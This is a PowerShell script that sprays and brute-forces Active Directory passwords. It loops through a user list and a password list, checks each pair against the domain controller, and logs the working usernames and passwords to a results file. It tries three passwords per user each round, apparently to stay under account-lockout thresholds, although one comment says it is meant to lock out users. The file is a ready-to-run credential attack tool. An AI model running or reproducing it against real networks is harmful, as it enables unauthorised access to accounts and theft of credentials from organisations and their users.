$UserDomain = $env:USERDOMAIN

Write-Host "[*] Inititalizing domain..."
Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
$ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
$PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)


$UserFile = "users.txt"
$PassFile = "passwords.txt"
$LogFile = "results.txt"
$UserCounter = 0
$Splitter = "-" * 50
$PassWordCount = (Get-Content $PassFile).Count
$UserTable = @{}

foreach($User in Get-Content $UserFile) {

    Write-Host "[*] Creating hashtables to store user information..."
    $UserCounter++
    $UserTable.$User = @()
    $UserTable.$User += 0
    $UserTable.$User += ""
}

Write-Host $Splitter

$LastPassValue = $UserTable.Values | Select -Last 1

Write-Host "[!] Starting brute force..."
Write-Host $Splitter
Start-Sleep -Seconds 5

While($LastPassValue -lt $PassWordCount){
    # The script checks 3 passwords at the same time in order to lock out any users.
    # This while loop ensures that all passwords in the list are checked.
    :UserLoop foreach ($User in $UserTable.GetEnumerator() | sort -Property name ) {
        # The loop runs for each user in the hashtable.
        if($UserTable[$User.Name][1] -ne 1){
            # The if statement checks if the password of the user has already been found.

            $CurrentPassCount = $User.Value[0]
            $CurrentUser = $User.Name

            1..3 | % {
                # Checks a range of three passwords.
                Start-Sleep -Seconds 0.5
                $CurrentPassword = Get-Content $PassFile | Select -Index $CurrentPasscount
                Write-Host -NoNewLine "`r[*] Checking $CurrentUser with password: $CurrentPassword"
                $CurrentPassCount = $CurrentPassCount + 1
                try {
                    $success = $principalContext.ValidateCredentials($CurrentUser, $CurrentPassword)
                }
                catch {
                    $success = $False
                    Write-Warning ($_.exception.message -replace '\r?\n' -split '"' -ne '')[-1]
                }
                if ($success -eq $True)
                    {
                        # If the user is successfully authenticated, this section is called.
                        # Here the information is written to a results file, and a found password tag is added to the user.

                        $UserInfo = "User: $CurrentUser, Password: $CurrentPassword"
                        $UserTable[$User.Name][1] = 1
                        Write-Output "`n[!] Password found: $UserInfo..."
                        $UserInfo | Add-Content $LogFile
                        Start-Sleep -Seconds 5
                        $PrincipalContext.Dispose()
                        $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)

                    }
            }
            $UserTable[$User.Name][0] = $CurrentPassCount
        }
        else{
            Write-Host "[*] Password already found for user: $User.Name..."
        }
    }
}
